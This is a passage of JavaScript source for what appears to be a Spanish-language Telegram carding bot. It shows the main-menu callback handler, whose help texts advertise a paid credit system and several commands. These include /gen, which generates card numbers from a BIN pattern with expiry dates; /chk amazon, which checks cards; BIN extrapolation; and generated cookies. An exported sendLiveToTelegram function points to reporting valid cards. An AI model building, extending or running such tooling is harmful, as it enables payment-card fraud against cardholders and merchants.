                [{ text: '💰 Créditos', callback_data: 'menu_creditos' }],
            ]
        }
    };
    await sendSafeMessage(msg.chat.id, '📋 *Menú principal*', { parse_mode: 'Markdown', ...opts });
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;
    let respuesta = '';
    switch(data){
        case 'menu_gencookie': respuesta = 'Obtén Usa `/gencookie MX` (o US, CA...). Cuesta 3 créditos.'; break;
        case 'menu_chk': respuesta = 'Usa `/chk amazon` y sigue las instrucciones.'; break;
        case 'menu_extrapolador': respuesta = 'Usa `/extrapolador 123456` para buscar por BIN.'; break;
        case 'menu_gen': respuesta = 'Usa `/gen 549949056298xxxx|05|2029 15`'; break;
        case 'menu_limpiador': respuesta = 'Usa `/limpiador` y luego envía el texto sucio.'; break;
        case 'menu_creditos': respuesta = 'Usa `/creditos` para ver tu saldo.'; break;
        default: respuesta = 'Opción no válida.';
    }
    await sendSafeMessage(chatId, respuesta, { parse_mode: 'Markdown' });
    await bot.answerCallbackQuery(callbackQuery.id);
});

module.exports = { bot, sendVerificationCodeToUser, sendLiveToTelegram, sendSafeMessage };
console.log('✅ Bot de Telegram listo');